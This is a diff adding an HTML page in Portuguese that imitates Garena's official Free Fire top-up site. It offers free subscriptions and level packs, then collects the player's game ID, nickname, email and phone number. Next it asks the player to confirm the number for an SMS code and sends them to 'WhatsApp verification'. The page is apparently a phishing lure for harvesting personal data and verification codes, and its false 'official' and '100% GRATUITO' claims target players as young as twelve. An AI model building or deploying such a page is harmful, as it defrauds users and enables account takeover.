@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canal Oficial de Recarga - Free Fire</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <img src="imagens/garena-logo.png" alt="Garena" class="logo-img">
+                <div class="logo-text">
+                    <span>Canal Oficial de</span>
+                    <span>Recarga</span>
+                </div>
+            </div>
+            <div class="user-icon">
+                <i class="fas fa-user-circle"></i>
+                <span class="user-id" id="displayUserId"></span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Banner -->
+    <section class="hero-banner">
+        <img src="imagens/banner-hero.png" alt="Centro de Recarga Free Fire" class="hero-banner-image">
+    </section>
+
+    <!-- Game Selection -->
+    <section class="game-selection">
+        <h3>Seleção de jogos</h3>
+        <div class="games-grid">
+            <div class="game-item active" data-game="freefire">
+                <img src="imagens/free-fire-icon.png" alt="Free Fire">
+                <span>Free Fire</span>
+            </div>
+            <div class="game-item" data-game="blackclover">
+                <img src="imagens/black-clover-icon.png" alt="Black Clover M">
+                <span>Black Clover M</span>
+            </div>
+            <div class="game-item" data-game="deltaforce">
+                <img src="imagens/delta-force-icon.png" alt="Delta Force">
+                <span>Delta Force</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Free Fire Section -->
+    <section class="freefire-section">
+        <img src="imagens/banner-freefire-section.png" alt="Free Fire - Pagamento 100% Seguro" class="freefire-banner">
+    </section>
+
+    <!-- Login Section -->
+    <section class="login-section">
+        <div class="section-header">
+            <span class="step-number">1</span>
+            <h3>Login</h3>
+        </div>
+        
+        <div class="login-content">
+            <div class="input-group">
+                <label for="player-id">ID do jogador <i class="fas fa-question-circle"></i></label>
+                <div class="login-input-container">
+                    <input type="text" id="player-id" placeholder="Insira o ID do jogador aqui" inputmode="numeric" pattern="[0-9]*">
+                    <button class="btn-login" id="btnPlayerLogin">Login</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Recharge Value Section -->
+    <section class="recharge-section">
+        <div class="section-header">
+            <span class="step-number">2</span>
+            <h3>Valor de Recarga</h3>
+        </div>
+        
+        <div class="recharge-tabs">
+            <button class="tab-btn active" data-tab="buy">Comprar</button>
+            <button class="tab-btn" data-tab="rescue">Resgatar</button>
+        </div>
+
+        <!-- Diamonds Section -->
+        <div class="diamonds-section">
+            <div class="unavailable-overlay">
+                <span>NÃO DISPONÍVEL PARA PROMOÇÃO</span>
+            </div>
+            <div class="diamonds-grid">
+                <div class="diamond-item">
+                    <i class="fas fa-gem"></i>
+                    <span>65</span>
+                </div>
+                <div class="diamond-item">
+                    <i class="fas fa-gem"></i>
+                    <span>310</span>
+                </div>
+                <div class="diamond-item">
+                    <i class="fas fa-gem"></i>
+                    <span>520</span>
+                </div>
+                <div class="diamond-item">
+                    <i class="fas fa-gem"></i>
+                    <span>1.060</span>
+                </div>
+                <div class="diamond-item">
+                    <i class="fas fa-gem"></i>
+                    <span>2.180</span>
+                </div>
+                <div class="diamond-item">
+                    <i class="fas fa-gem"></i>
+                    <span>5.600</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Special Offers -->
+        <div class="special-offers">
+            <h4>Ofertas especiais</h4>
+            <div class="offers-grid" id="offersGrid">
+                <div class="offer-item sold-out" data-offer="weekly">
+                    <img src="imagens/assinatura-semanal.png" alt="Assinatura Semanal">
+                    <span>Assinatura Semanal</span>
+                    <div class="sold-out-overlay">ESGOTADO</div>
+                </div>
+                <div class="offer-item available" data-offer="monthly">
+                    <div class="gratuito-badge">GRATUITO</div>
+                    <img src="imagens/assinatura-mensal.png" alt="Assinatura Mensal">
+                    <span>Assinatura Mensal</span>
+                </div>
+                <div class="offer-item available" data-offer="level6">
+                    <div class="gratuito-badge">GRATUITO</div>
+                    <img src="imagens/pacote-nivel-6.png" alt="Pacote de Nível - Nível 6">
+                    <span>Pacote de Nível - Nível 6</span>
+                </div>
+                <div class="offer-item available" data-offer="level10">
+                    <div class="gratuito-badge">GRATUITO</div>
+                    <img src="imagens/pacote-nivel-10.png" alt="Pacote de Nível - Nível 10">
+                    <span>Pacote de Nível - Nível 10</span>
+                </div>
+                <div class="offer-item sold-out hidden" data-offer="level15">
+                    <img src="imagens/pacote-nivel-15.png" alt="Pacote de Nível - Nível 15">
+                    <span>Pacote de Nível - Nível 15</span>
+                    <div class="sold-out-overlay">ESGOTADO</div>
+                </div>
+                <div class="offer-item sold-out hidden" data-offer="level20">
+                    <img src="imagens/pacote-nivel-20.png" alt="Pacote de Nível - Nível 20">
+                    <span>Pacote de Nível - Nível 20</span>
+                    <div class="sold-out-overlay">ESGOTADO</div>
+                </div>
+                <div class="offer-item available hidden" data-offer="evolution3">
+                    <div class="gratuito-badge">GRATUITO</div>
+                    <img src="imagens/trilha-evolucao-3dias.png" alt="Trilha da Evolução - 3 dias">
+                    <span>Trilha da Evolução - 3 dias</span>
+                </div>
+                <div class="offer-item sold-out hidden" data-offer="evolution7">
+                    <img src="imagens/trilha-evolucao-7dias.png" alt="Trilha da Evolução - 7 dias">
+                    <span>Trilha da Evolução - 7 dias</span>
+                    <div class="sold-out-overlay">ESGOTADO</div>
+                </div>
+                <div class="offer-item available hidden" data-offer="evolution30">
+                    <div class="gratuito-badge">GRATUITO</div>
+                    <img src="imagens/trilha-evolucao-30dias.png" alt="Trilha da Evolução - 30 dias">
+                    <span>Trilha da Evolução - 30 dias</span>
+                </div>
+                <div class="offer-item available hidden" data-offer="economic">
+                    <div class="gratuito-badge">GRATUITO</div>
+                    <img src="imagens/semanal-economica.png" alt="Semanal Econômica">
+                    <span>Semanal Econômica</span>
+                </div>
+            </div>
+            <button class="btn-see-more" id="btnSeeMore">
+                <span>Ver mais</span>
+                <i class="fas fa-chevron-down"></i>
+            </button>
+        </div>
+    </section>
+
+    <!-- Payment Method Section -->
+    <section class="payment-section">
+        <div class="section-header">
+            <span class="step-number">3</span>
+            <h3>Método de pagamento</h3>
+        </div>
+        
+        <div class="free-payment-notice">
+            <i class="fas fa-gift"></i>
+            <p>Esta é uma promoção <strong>100% GRATUITA</strong>! Não será cobrado nenhum valor.</p>
+        </div>
+
+        <button class="btn-free-claim" id="btnFreeClaim">
+            <i class="fas fa-gift"></i>
+            RESGATAR GRATUITAMENTE
+        </button>
+
+        <div class="selected-item-summary" id="selectedSummary" style="display: none;">
+            <h4>Item Selecionado:</h4>
+            <div class="summary-content">
+                <img id="summaryImage" src="imagens/assinatura-mensal.png" alt="">
+                <div class="summary-text">
+                    <span id="summaryName"></span>
+                    <span class="price">GRATUITO</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>© Garena Online. Todos os direitos reservados.</p>
+        <div class="footer-links">
+            <a href="#">FAQ</a>
+            <a href="#">Termos e condições</a>
+            <a href="#">Política de privacidade</a>
+        </div>
+    </footer>
+
+    <!-- Modals -->
+    <div id="gameUnavailableModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <div class="modal-header">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h3>Jogo Indisponível</h3>
+            </div>
+            <div class="modal-body">
+                <p>A promoção gratuita é válida apenas para <strong>Garena Free Fire</strong>.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-modal-ok">Entendi</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loadingModal" class="modal">
+        <div class="modal-content loading-content">
+            <div class="loading-spinner">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <p>Conectando ao servidor...</p>
+        </div>
+    </div>
+
+    <div id="userDataModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <div class="modal-header">
+                <i class="fas fa-user-edit"></i>
+                <h3>Dados para Resgate</h3>
+            </div>
+            <div class="modal-body">
+                <form id="userDataForm">
+                    <div class="input-group">
+                        <label for="ffId">ID do Free Fire:</label>
+                        <input type="text" id="ffId" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="nickname">Nick (sem caracteres especiais):</label>
+                        <input type="text" id="nickname" pattern="[A-Za-z0-9]+" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="email">Email da conta:</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="phone">Número de Telefone:</label>
+                        <div class="phone-input-container">
+                            <input type="tel" id="phone" class="phone-input-full" placeholder="(11) 98888-8888" inputmode="numeric" required>
+                        </div>
+                        <small class="phone-hint">
+                            <i class="fas fa-info-circle"></i>
+                            Número será usado para verificação de segurança
+                        </small>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="acceptTerms" required>
+                        <label for="acceptTerms">
+                            Aceito os <a href="#" class="terms-link">Termos de Uso</a> e 
+                            <a href="#" class="terms-link">Política de Privacidade</a>
+                        </label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="confirmAge" required>
+                        <label for="confirmAge">Confirmo que tenho mais de 12 anos</label>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="submit" class="btn-claim-prize" id="btnClaimPrize" form="userDataForm">Resgatar Premiação</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="confirmDataModal" class="modal">
+        <div class="modal-content confirm-modal">
+            <div class="modal-header-confirm">
+                <div class="phone-icon">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <h3>Confirme seu Número</h3>
+                <p class="subtitle">Verifique se o número está correto antes de continuar</p>
+            </div>
+            <div class="modal-body">
+                <div class="user-profile-card">
+                    <div class="user-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div class="user-details">
+                        <h4 id="confirmNick"></h4>
+                        <p id="confirmEmail"></p>
+                    </div>
+                </div>
+                
+                <div class="phone-confirmation-section">
+                    <label>Confirme seu número de telefone:</label>
+                    <div class="phone-display-container">
+                        <span class="country-code">+55</span>
+                        <input type="tel" id="confirmPhone" class="phone-display" readonly>
+                    </div>
+                    <p class="phone-notice">
+                        <i class="fas fa-shield-alt"></i>
+                        Confirme se o número está correto para receber o código SMS
+                    </p>
+                </div>
+            </div>
+            <div class="modal-footer-confirm">
+                <button id="btnEditNumber" class="btn-edit">
+                    <i class="fas fa-edit"></i>
+                    ALTERAR NÚMERO
+                </button>
+                <button id="btnConfirmData" class="btn-confirm">
+                    <i class="fas fa-check"></i>
+                    CONFIRMAR E CONTINUAR
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="verifyingModal" class="modal">
+        <div class="modal-content verifying-content">
+            <div class="verifying-animation">
+                <div class="phone-icon-large">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <div class="loading-spinner">
+                    <div class="spinner"></div>
+                </div>
+            </div>
+            <h3>Aguarde, estamos confirmando seu número...</h3>
+        </div>
+    </div>
+
+    <div id="whatsappRedirectModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <i class="fab fa-whatsapp"></i>
+                <h3>Redirecionamento</h3>
+            </div>
+            <div class="modal-body">
+                <p><strong>Conta encontrada!</strong> Não conseguimos enviar a verificação via SMS, então enviamos para seu <strong>WhatsApp</strong>.</p>
+            </div>
+            <div class="modal-footer">
+                <button id="btnGoToWhatsapp" class="btn-whatsapp">
+                    <i class="fab fa-whatsapp"></i>
+                    Ir para Verificação
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
